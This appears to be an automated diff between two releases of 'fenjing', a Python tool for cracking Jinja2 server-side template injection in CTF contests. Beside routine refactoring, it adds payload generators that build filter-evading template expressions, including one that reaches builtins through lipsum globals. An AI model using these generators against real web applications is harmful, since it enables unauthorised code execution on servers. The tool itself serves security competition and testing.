# Comparing `tmp/fenjing-0.2.6.tar.gz` & `tmp/fenjing-0.2.7.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "fenjing-0.2.6.tar", last modified: Mon May 15 04:59:22 2023, max compression
+gzip compressed data, was "fenjing-0.2.7.tar", last modified: Mon May 15 11:37:02 2023, max compression
```

## Comparing `fenjing-0.2.6.tar` & `fenjing-0.2.7.tar`

### file list

```diff
@@ -1,32 +1,32 @@
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-15 04:59:22.290343 fenjing-0.2.6/
--rw-r--r--   0 runner    (1001) docker     (123)    16725 2023-05-15 04:59:04.000000 fenjing-0.2.6/LICENSE
--rw-r--r--   0 runner    (1001) docker     (123)       41 2023-05-15 04:59:04.000000 fenjing-0.2.6/MANIFEST.in
--rw-r--r--   0 runner    (1001) docker     (123)     5101 2023-05-15 04:59:22.290343 fenjing-0.2.6/PKG-INFO
--rwxr-xr-x   0 runner    (1001) docker     (123)     4663 2023-05-15 04:59:04.000000 fenjing-0.2.6/README.md
--rw-r--r--   0 runner    (1001) docker     (123)        6 2023-05-15 04:59:04.000000 fenjing-0.2.6/VERSION
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-15 04:59:22.286343 fenjing-0.2.6/fenjing/
--rwxr-xr-x   0 runner    (1001) docker     (123)      202 2023-05-15 04:59:04.000000 fenjing-0.2.6/fenjing/__init__.py
--rw-r--r--   0 runner    (1001) docker     (123)       60 2023-05-15 04:59:04.000000 fenjing-0.2.6/fenjing/__main__.py
--rw-r--r--   0 runner    (1001) docker     (123)     6326 2023-05-15 04:59:04.000000 fenjing-0.2.6/fenjing/cli.py
--rw-r--r--   0 runner    (1001) docker     (123)      800 2023-05-15 04:59:04.000000 fenjing-0.2.6/fenjing/colorize.py
--rw-r--r--   0 runner    (1001) docker     (123)      825 2023-05-15 04:59:04.000000 fenjing-0.2.6/fenjing/config_payload.py
--rw-r--r--   0 runner    (1001) docker     (123)     1213 2023-05-15 04:59:04.000000 fenjing-0.2.6/fenjing/const.py
--rwxr-xr-x   0 runner    (1001) docker     (123)       37 2023-05-15 04:59:04.000000 fenjing-0.2.6/fenjing/exceptions.py
--rw-r--r--   0 runner    (1001) docker     (123)     2651 2023-05-15 04:59:04.000000 fenjing-0.2.6/fenjing/form.py
--rw-r--r--   0 runner    (1001) docker     (123)    11548 2023-05-15 04:59:04.000000 fenjing-0.2.6/fenjing/form_cracker.py
--rwxr-xr-x   0 runner    (1001) docker     (123)     3141 2023-05-15 04:59:04.000000 fenjing-0.2.6/fenjing/full_payload_gen.py
--rwxr-xr-x   0 runner    (1001) docker     (123)     2846 2023-05-15 04:59:04.000000 fenjing-0.2.6/fenjing/int_vars.py
--rw-r--r--   0 runner    (1001) docker     (123)    26945 2023-05-15 04:59:04.000000 fenjing-0.2.6/fenjing/payload_gen.py
--rw-r--r--   0 runner    (1001) docker     (123)     1549 2023-05-15 04:59:04.000000 fenjing-0.2.6/fenjing/requester.py
--rw-r--r--   0 runner    (1001) docker     (123)     1156 2023-05-15 04:59:04.000000 fenjing-0.2.6/fenjing/scan_url.py
--rw-r--r--   0 runner    (1001) docker     (123)      922 2023-05-15 04:59:04.000000 fenjing-0.2.6/fenjing/shell_payload.py
--rw-r--r--   0 runner    (1001) docker     (123)     2880 2023-05-15 04:59:04.000000 fenjing-0.2.6/fenjing/waf_func_gen.py
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-15 04:59:22.290343 fenjing-0.2.6/fenjing.egg-info/
--rw-r--r--   0 runner    (1001) docker     (123)     5101 2023-05-15 04:59:22.000000 fenjing-0.2.6/fenjing.egg-info/PKG-INFO
--rw-r--r--   0 runner    (1001) docker     (123)      558 2023-05-15 04:59:22.000000 fenjing-0.2.6/fenjing.egg-info/SOURCES.txt
--rw-r--r--   0 runner    (1001) docker     (123)        1 2023-05-15 04:59:22.000000 fenjing-0.2.6/fenjing.egg-info/dependency_links.txt
--rw-r--r--   0 runner    (1001) docker     (123)       30 2023-05-15 04:59:22.000000 fenjing-0.2.6/fenjing.egg-info/requires.txt
--rw-r--r--   0 runner    (1001) docker     (123)        8 2023-05-15 04:59:22.000000 fenjing-0.2.6/fenjing.egg-info/top_level.txt
--rw-r--r--   0 runner    (1001) docker     (123)       30 2023-05-15 04:59:04.000000 fenjing-0.2.6/requirements.txt
--rw-r--r--   0 runner    (1001) docker     (123)       38 2023-05-15 04:59:22.290343 fenjing-0.2.6/setup.cfg
--rw-r--r--   0 runner    (1001) docker     (123)      860 2023-05-15 04:59:04.000000 fenjing-0.2.6/setup.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-15 11:37:02.323589 fenjing-0.2.7/
+-rw-r--r--   0 runner    (1001) docker     (123)    16725 2023-05-15 11:36:51.000000 fenjing-0.2.7/LICENSE
+-rw-r--r--   0 runner    (1001) docker     (123)       41 2023-05-15 11:36:51.000000 fenjing-0.2.7/MANIFEST.in
+-rw-r--r--   0 runner    (1001) docker     (123)     6059 2023-05-15 11:37:02.323589 fenjing-0.2.7/PKG-INFO
+-rwxr-xr-x   0 runner    (1001) docker     (123)     5621 2023-05-15 11:36:51.000000 fenjing-0.2.7/README.md
+-rw-r--r--   0 runner    (1001) docker     (123)        6 2023-05-15 11:36:51.000000 fenjing-0.2.7/VERSION
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-15 11:37:02.323589 fenjing-0.2.7/fenjing/
+-rwxr-xr-x   0 runner    (1001) docker     (123)      202 2023-05-15 11:36:51.000000 fenjing-0.2.7/fenjing/__init__.py
+-rw-r--r--   0 runner    (1001) docker     (123)       60 2023-05-15 11:36:51.000000 fenjing-0.2.7/fenjing/__main__.py
+-rw-r--r--   0 runner    (1001) docker     (123)     6326 2023-05-15 11:36:51.000000 fenjing-0.2.7/fenjing/cli.py
+-rw-r--r--   0 runner    (1001) docker     (123)      800 2023-05-15 11:36:51.000000 fenjing-0.2.7/fenjing/colorize.py
+-rw-r--r--   0 runner    (1001) docker     (123)      825 2023-05-15 11:36:51.000000 fenjing-0.2.7/fenjing/config_payload.py
+-rw-r--r--   0 runner    (1001) docker     (123)     1213 2023-05-15 11:36:51.000000 fenjing-0.2.7/fenjing/const.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)       37 2023-05-15 11:36:51.000000 fenjing-0.2.7/fenjing/exceptions.py
+-rw-r--r--   0 runner    (1001) docker     (123)     2651 2023-05-15 11:36:51.000000 fenjing-0.2.7/fenjing/form.py
+-rw-r--r--   0 runner    (1001) docker     (123)    11548 2023-05-15 11:36:51.000000 fenjing-0.2.7/fenjing/form_cracker.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)     3474 2023-05-15 11:36:51.000000 fenjing-0.2.7/fenjing/full_payload_gen.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)     2846 2023-05-15 11:36:51.000000 fenjing-0.2.7/fenjing/int_vars.py
+-rw-r--r--   0 runner    (1001) docker     (123)    28509 2023-05-15 11:36:51.000000 fenjing-0.2.7/fenjing/payload_gen.py
+-rw-r--r--   0 runner    (1001) docker     (123)     1549 2023-05-15 11:36:51.000000 fenjing-0.2.7/fenjing/requester.py
+-rw-r--r--   0 runner    (1001) docker     (123)     1183 2023-05-15 11:36:51.000000 fenjing-0.2.7/fenjing/scan_url.py
+-rw-r--r--   0 runner    (1001) docker     (123)      922 2023-05-15 11:36:51.000000 fenjing-0.2.7/fenjing/shell_payload.py
+-rw-r--r--   0 runner    (1001) docker     (123)     2880 2023-05-15 11:36:51.000000 fenjing-0.2.7/fenjing/waf_func_gen.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-15 11:37:02.323589 fenjing-0.2.7/fenjing.egg-info/
+-rw-r--r--   0 runner    (1001) docker     (123)     6059 2023-05-15 11:37:02.000000 fenjing-0.2.7/fenjing.egg-info/PKG-INFO
+-rw-r--r--   0 runner    (1001) docker     (123)      558 2023-05-15 11:37:02.000000 fenjing-0.2.7/fenjing.egg-info/SOURCES.txt
+-rw-r--r--   0 runner    (1001) docker     (123)        1 2023-05-15 11:37:02.000000 fenjing-0.2.7/fenjing.egg-info/dependency_links.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       30 2023-05-15 11:37:02.000000 fenjing-0.2.7/fenjing.egg-info/requires.txt
+-rw-r--r--   0 runner    (1001) docker     (123)        8 2023-05-15 11:37:02.000000 fenjing-0.2.7/fenjing.egg-info/top_level.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       30 2023-05-15 11:36:51.000000 fenjing-0.2.7/requirements.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       38 2023-05-15 11:37:02.323589 fenjing-0.2.7/setup.cfg
+-rw-r--r--   0 runner    (1001) docker     (123)      860 2023-05-15 11:36:51.000000 fenjing-0.2.7/setup.py
```

### Comparing `fenjing-0.2.6/LICENSE` & `fenjing-0.2.7/LICENSE`

 * *Files identical despite different names*

### Comparing `fenjing-0.2.6/PKG-INFO` & `fenjing-0.2.7/README.md`

 * *Files 10% similar despite different names*

```diff
@@ -1,20 +1,7 @@
-Metadata-Version: 2.1
-Name: fenjing
-Version: 0.2.6
-Summary: A Jinja2 SSTI cracker for CTF competitions
-Home-page: https://github.com/Marven11/Fenjing
-Author: Marven11
-Author-email: marven11@example.com
-Classifier: Programming Language :: Python :: 3.9
-Classifier: License :: OSI Approved :: Mozilla Public License 2.0 (MPL 2.0)
-Classifier: Operating System :: OS Independent
-Description-Content-Type: text/markdown
-License-File: LICENSE
-
 ![焚靖](assets/fenjing.webp)
 
 > Bypass the WAF without knowing WAF
 
 焚靖是一个针对Jinja2 SSTI的命令行脚本，具有强大的自动绕过WAF功能
 
 ## 演示
@@ -189,7 +176,12 @@
     config_payload = config_payload(waf)
 
     print(f"{shell_payload=}")
     print(f"{config_payload=}")
 
 ```
 
+## 项目结构
+
+[![](https://mermaid.ink/img/pako:eNqFVMtugzAQ_BXLUm7hBzj0UPUP2iMS2thrsGps6keiNMq_F5pS2xhan2BmdryeNdwoMxxpTYUyF9aD9eTtudFkWi6cOgtjT4KXypEHOC9mlLHyEyNi8SOg82gjJIwd0hLt_OMVNV_5w8kEX41wVQa4i0VS-_YMNkFcj0q1P8rMXciuxEWI6rZDHZkC3OsqP4ZjoNtgVUQuIFoRNMvt56qWWWDvSyS__ocDYUqSqnpKIkqRvG5h8p0Tk1X0CZOPaSJS91UDW2zpXEjyLVb0vMHmAAqbMsR14besNNpS5bcmvxpkv6n5eFt2RYr_CpZR7YSY0XEC2dX-u880ru0WCkU26YJNmqRHOqAdQPLpn3CbSxrqexywofX0yFFAUL6hjb5PUgjevF41o7W3AY80jBw8vkiYPqGB1gKUw_sXrbFnVA?type=png)](https://mermaid.live/edit#pako:eNqFVMtugzAQ_BXLUm7hBzj0UPUP2iMS2thrsGps6keiNMq_F5pS2xhan2BmdryeNdwoMxxpTYUyF9aD9eTtudFkWi6cOgtjT4KXypEHOC9mlLHyEyNi8SOg82gjJIwd0hLt_OMVNV_5w8kEX41wVQa4i0VS-_YMNkFcj0q1P8rMXciuxEWI6rZDHZkC3OsqP4ZjoNtgVUQuIFoRNMvt56qWWWDvSyS__ocDYUqSqnpKIkqRvG5h8p0Tk1X0CZOPaSJS91UDW2zpXEjyLVb0vMHmAAqbMsR14besNNpS5bcmvxpkv6n5eFt2RYr_CpZR7YSY0XEC2dX-u880ru0WCkU26YJNmqRHOqAdQPLpn3CbSxrqexywofX0yFFAUL6hjb5PUgjevF41o7W3AY80jBw8vkiYPqGB1gKUw_sXrbFnVA)
+
+
```

### Comparing `fenjing-0.2.6/fenjing/cli.py` & `fenjing-0.2.7/fenjing/cli.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.2.6/fenjing/colorize.py` & `fenjing-0.2.7/fenjing/colorize.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.2.6/fenjing/config_payload.py` & `fenjing-0.2.7/fenjing/config_payload.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.2.6/fenjing/const.py` & `fenjing-0.2.7/fenjing/const.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.2.6/fenjing/form.py` & `fenjing-0.2.7/fenjing/form.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.2.6/fenjing/form_cracker.py` & `fenjing-0.2.7/fenjing/form_cracker.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.2.6/fenjing/full_payload_gen.py` & `fenjing-0.2.7/fenjing/full_payload_gen.py`

 * *Files 20% similar despite different names*

```diff
@@ -17,15 +17,16 @@
 
 def get_str_context(waf_func):
     str_vars = [
         ("un", "_", "{%set un=(lipsum|escape|batch(22)|list|first|last)%}"),
         ("perc", "%", "{%set perc=(lipsum[(lipsum|escape|batch(22)|list|first|last)*2" +
          "+dict(globals=x)|join+(lipsum|escape|batch(22)|list|first|last)*2]" +
          "[(lipsum|escape|batch(22)|list|first|last)*2+dict(builtins=x)" +
-         "|join+(lipsum|escape|batch(22)|list|first|last)*2][dict(chr=x)|join](37))%}")
+         "|join+(lipsum|escape|batch(22)|list|first|last)*2][dict(chr=x)|join](37))%}"),
+        # ("fc", "{:c}", "{%set fc={{{1:2}|string|replace({1:2}|string|batch(4)|first|last,{}|join)|replace(1|string,{}|join)|replace(2|string,dict(c=1)|join)}}%}")
     ]
     str_vars = [tpl for tpl in str_vars if waf_func(tpl[2])]
     return "".join(payload for _, _, payload in str_vars), {var_name: var_value for var_name, var_value, _ in str_vars}
 
 
 def get_outer_pattern(waf_func):
     outer_payloads = [
@@ -61,28 +62,33 @@
         if not self.outer_pattern:
             return False
         if self.will_print:
             logger.info(f"use {colored('blue', self.outer_pattern)}")
         else:
             logger.warning(
                 f"use {colored('blue', self.outer_pattern)}, which {colored('red', 'will not print')} your result!")
+
+        self.payload_gen = payload_gen.PayloadGenerator(self.waf_func, self.context)
+
         self.prepared = True
         return True
 
     def generate(self, gen_type, *args) -> Tuple[str | None, bool | None]:
 
         if not self.prepared and not self.do_prepare():
             return None, None
 
-        inner_payload = payload_gen.generate(
-            gen_type,
-            *args,
-            waf_func=self.waf_func,
-            context=self.context
-        )
+        # inner_payload = payload_gen.generate(
+        #     gen_type,
+        #     *args,
+        #     waf_func=self.waf_func,
+        #     context=self.context
+        # )
+
+        inner_payload = self.payload_gen.generate(gen_type, *args)
 
         if inner_payload is None:
             logger.warning("Bypassing WAF Failed.")
             return None, None
 
         assert isinstance(self.outer_pattern, str)
```

### Comparing `fenjing-0.2.6/fenjing/int_vars.py` & `fenjing-0.2.7/fenjing/int_vars.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.2.6/fenjing/payload_gen.py` & `fenjing-0.2.7/fenjing/payload_gen.py`

 * *Files 2% similar despite different names*

```diff
@@ -25,23 +25,30 @@
         self.context = context
         self.cache = {}
         self.generate_funcs = {
             LITERAL: self.literal_generate,
             UNSATISFIED: self.unsatisfied_generate
         }
 
-    def add_cache(self, gen_type, *args, result=None):
+    def cache_add(self, gen_type, *args, result=None):
         try:
             # hash() might fail
             if (gen_type, *args) in self.cache:
                 return
             self.cache[(gen_type, *args)] = result
         except Exception:
             return
 
+    def cache_has(self, gen_type, *args, result=None):
+        try:
+            # hash() might fail
+            return (gen_type, *args) in self.cache
+        except Exception:
+            return False
+
     def count_success(self, gen_type, req_gen_func_name):
         used_count[req_gen_func_name] += 1
         req_gens[gen_type].sort(
             key=(lambda gen_func: used_count[gen_func.__name__]), reverse=True)
 
     def generate_by_req_list(self, req_list):
         payload = ""
@@ -65,15 +72,15 @@
                 return None
             return self.cache[(gen_type, *args)]
         except Exception:
             return None
 
     def default_generate(self, gen_type: str, *args):
 
-        if self.cached_generate(gen_type, *args):
+        if self.cache_has(gen_type, *args):
             return self.cached_generate(gen_type, *args)
 
         if gen_type not in req_gens:
             raise Exception(f"Required type '{gen_type}' not supported.")
 
         for req_gen_func in req_gens[gen_type].copy():
             son_req = req_gen_func(self.context, *args)
@@ -83,15 +90,15 @@
             assert all(isinstance(gen_type, str) for gen_type, *
                        args in son_req), f"Wrong son_req {son_req} from {req_gen_func.__name__}"
 
             payload = self.generate_by_req_list(son_req)
             if not payload:
                 continue
             self.count_success(gen_type, req_gen_func.__name__)
-            self.add_cache(gen_type, *args, result=payload)
+            self.cache_add(gen_type, *args, result=payload)
             if gen_type in (INTEGER, STRING) and payload != str(args[0]):
                 logger.info("{great}, {gen_type}({args_repl}) can be {payload}".format(
                     great=colored("green", "Great"),
                     gen_type=colored("yellow", gen_type, bold=True),
                     args_repl=colored("yellow", ", ".join(repr(arg)
                                       for arg in args)),
                     payload=colored("blue", payload)
@@ -107,15 +114,15 @@
             # logger.warning(f"{log.colored('green', gen_type.upper())} {args_repl} should be {log.colored('blue', payload)}")
             return payload
         logger.warning("{failed} generating {gen_type}({args_repl})".format(
             failed=colored("red", "failed"),
             gen_type=gen_type,
             args_repl=", ".join(repr(arg) for arg in args),
         ))
-        self.add_cache(gen_type, *args, result=None)
+        self.cache_add(gen_type, *args, result=None)
         return None
 
     def generate(self, gen_type, *args):
         generate_func = self.generate_funcs[gen_type] if gen_type in self.generate_funcs else self.default_generate
         return generate_func(gen_type, *args)
 
 
@@ -756,14 +763,22 @@
         (LITERAL, "({})".format(
             "+".join('"{}"'.format(c if c != '"' else '\\"') for c in value)
         ))
     ]
 
 
 @req_gen
+def gen_string_concat3(context: dict, value: str):
+    return [
+        (LITERAL, "({})".format(
+            "".join('"{}"'.format(c if c != '"' else '\\"') for c in value)
+        ))
+    ]
+
+@req_gen
 def gen_string_dictjoin(context: dict, value: str):
     if not re.match("^[a-zA-Z_]+$", value):
         return [
             (UNSATISFIED, )
         ]
     return [
         (LITERAL, "(dict({}=x)|join)".format(value))
@@ -865,14 +880,57 @@
             req.append((LITERAL, ","))
         req.append((INTEGER, ord(c)))
     req.append(
         (LITERAL, "))")
     )
     return req
 
+@req_gen
+def gen_string_formatfunc2(context: dict, value: str):
+    # (FORMAT(97,98,99))
+    # FORMAT = (CS.format)
+    # CS = (C*L)
+    if "{:c}" not in context.values():
+        return [
+            (UNSATISFIED, )
+        ]
+    k = [k for k, v in context.values() if v == "{:c}"][0]
+    cs = "({c}*{l})".format(
+        c = k,
+        l = len(value)
+    )
+    format_func = (ATTRIBUTE, (LITERAL, cs), "format")
+    req = [
+        (LITERAL, "("),
+        format_func,
+        (LITERAL, "("),
+        (LITERAL, ",".join(str(ord(c)) for c in value)),
+        (LITERAL, "))")
+    ]
+    return req
+
+@req_gen
+def gen_string_formatfunc3(context: dict, value: str):
+    # (FORMAT(97,98,99))
+    # FORMAT = (CS.format)
+    # CS = (C*L)
+    cs = "(({c})*{l})".format(
+        c = "{1:2}|string|replace({1:2}|string|batch(4)|first|last,{}|join)|replace(1|string,{}|join)|replace(2|string,dict(c=1)|join)",
+        l = len(value)
+    )
+    format_func = (ATTRIBUTE, (LITERAL, cs), "format")
+    req = [
+        (LITERAL, "("),
+        format_func,
+        (LITERAL, "("),
+        (LITERAL, ",".join(str(ord(c)) for c in value)),
+        (LITERAL, "))")
+    ]
+    return req
+
 # ---
 
 
 @req_gen
 def gen_attribute_normal1(context, obj_req, attr_name):
     if not re.match("[A-Za-z_][A-Za-z0-9_]+", attr_name):
         return [
```

### Comparing `fenjing-0.2.6/fenjing/requester.py` & `fenjing-0.2.7/fenjing/requester.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.2.6/fenjing/scan_url.py` & `fenjing-0.2.7/fenjing/scan_url.py`

 * *Files 8% similar despite different names*

```diff
@@ -26,19 +26,22 @@
 
 
 def yield_form(requester, start_url):
     found = False
     targets = [start_url, ]
     visited = set()
     while targets:
-        target_url, *targets = targets
+        target_url = targets.pop(0)
         if target_url in visited:
             continue
         visited.add(target_url)
+
         resp = requester.request(method="GET", url=target_url)
         html = BeautifulSoup(resp.text, "html.parser")
         forms = parse_forms(target_url, html)
-        yield target_url, forms
+
+        if forms:
+            yield target_url, forms
+            found = True
         targets += parse_urls(html)
-        found = True
     if not found:
-        logger.warning("Exit without finding form element")
+        logger.warning("Exit without finding <form> element")
```

### Comparing `fenjing-0.2.6/fenjing/shell_payload.py` & `fenjing-0.2.7/fenjing/shell_payload.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.2.6/fenjing/waf_func_gen.py` & `fenjing-0.2.7/fenjing/waf_func_gen.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.2.6/fenjing.egg-info/PKG-INFO` & `fenjing-0.2.7/PKG-INFO`

 * *Files 18% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: fenjing
-Version: 0.2.6
+Version: 0.2.7
 Summary: A Jinja2 SSTI cracker for CTF competitions
 Home-page: https://github.com/Marven11/Fenjing
 Author: Marven11
 Author-email: marven11@example.com
 Classifier: Programming Language :: Python :: 3.9
 Classifier: License :: OSI Approved :: Mozilla Public License 2.0 (MPL 2.0)
 Classifier: Operating System :: OS Independent
@@ -189,7 +189,12 @@
     config_payload = config_payload(waf)
 
     print(f"{shell_payload=}")
     print(f"{config_payload=}")
 
 ```
 
+## 项目结构
+
+[![](https://mermaid.ink/img/pako:eNqFVMtugzAQ_BXLUm7hBzj0UPUP2iMS2thrsGps6keiNMq_F5pS2xhan2BmdryeNdwoMxxpTYUyF9aD9eTtudFkWi6cOgtjT4KXypEHOC9mlLHyEyNi8SOg82gjJIwd0hLt_OMVNV_5w8kEX41wVQa4i0VS-_YMNkFcj0q1P8rMXciuxEWI6rZDHZkC3OsqP4ZjoNtgVUQuIFoRNMvt56qWWWDvSyS__ocDYUqSqnpKIkqRvG5h8p0Tk1X0CZOPaSJS91UDW2zpXEjyLVb0vMHmAAqbMsR14besNNpS5bcmvxpkv6n5eFt2RYr_CpZR7YSY0XEC2dX-u880ru0WCkU26YJNmqRHOqAdQPLpn3CbSxrqexywofX0yFFAUL6hjb5PUgjevF41o7W3AY80jBw8vkiYPqGB1gKUw_sXrbFnVA?type=png)](https://mermaid.live/edit#pako:eNqFVMtugzAQ_BXLUm7hBzj0UPUP2iMS2thrsGps6keiNMq_F5pS2xhan2BmdryeNdwoMxxpTYUyF9aD9eTtudFkWi6cOgtjT4KXypEHOC9mlLHyEyNi8SOg82gjJIwd0hLt_OMVNV_5w8kEX41wVQa4i0VS-_YMNkFcj0q1P8rMXciuxEWI6rZDHZkC3OsqP4ZjoNtgVUQuIFoRNMvt56qWWWDvSyS__ocDYUqSqnpKIkqRvG5h8p0Tk1X0CZOPaSJS91UDW2zpXEjyLVb0vMHmAAqbMsR14besNNpS5bcmvxpkv6n5eFt2RYr_CpZR7YSY0XEC2dX-u880ru0WCkU26YJNmqRHOqAdQPLpn3CbSxrqexywofX0yFFAUL6hjb5PUgjevF41o7W3AY80jBw8vkiYPqGB1gKUw_sXrbFnVA)
+
+
```

### Comparing `fenjing-0.2.6/fenjing.egg-info/SOURCES.txt` & `fenjing-0.2.7/fenjing.egg-info/SOURCES.txt`

 * *Files identical despite different names*

### Comparing `fenjing-0.2.6/setup.py` & `fenjing-0.2.7/setup.py`

 * *Files identical despite different names*

